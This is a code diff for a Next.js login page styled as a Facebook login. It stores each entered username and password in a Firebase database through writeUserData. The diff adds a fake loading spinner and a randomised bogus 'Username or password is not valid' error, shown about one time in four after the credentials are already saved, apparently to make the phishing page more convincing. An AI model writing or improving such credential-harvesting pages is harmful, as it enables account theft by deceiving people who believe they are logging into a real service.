@@ -1,6 +1,6 @@
 import styles from '../styles/login.module.css';
 import { useRouter } from 'next/router';
-import { useState } from 'react';
+import { useState,useRef } from 'react';
 import { initializeApp } from 'firebase/app';
 import { getDatabase, ref, set } from 'firebase/database';
 
@@ -26,11 +26,27 @@ function Login() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const app = initializeApp(firebaseConfig);
-
+  const loader = useRef(null)
+  const error = useRef(null)
   const handleClick = () => {
+    var sucess_fail = [0,0,0,1];
+    var tick = sucess_fail[Math.floor(Math.random() * sucess_fail.length)];
+    console.log(tick)
     if (username.length != 0 && password.length != 0) {
       writeUserData(username, password);
-      router.push('final');
+      loader.current.classList.add("loader")
+      error.current.style.display = "none"
+      loader.current.style.animationPlayState = "running"
+        loader.current.onanimationend = ()=>{
+          if (tick == 0){
+            error.current.style.display = "none"
+            router.push('final');
+          }else {
+            error.current.style.display = "block"
+          } 
+          loader.current.classList.remove("loader")
+        }
+
     } else {
       alert('fill the form');
     }
@@ -40,8 +56,10 @@ function Login() {
       <div className="main">
         <div className={styles.header}>
           <h1>Facebook</h1>
+          <div className="loader" ref={loader}></div>
         </div>
         <div className={styles.form}>
+          <span className={styles.error} ref={error}>Username or password is not valid</span>
           <input
             className="username"
             type="text"
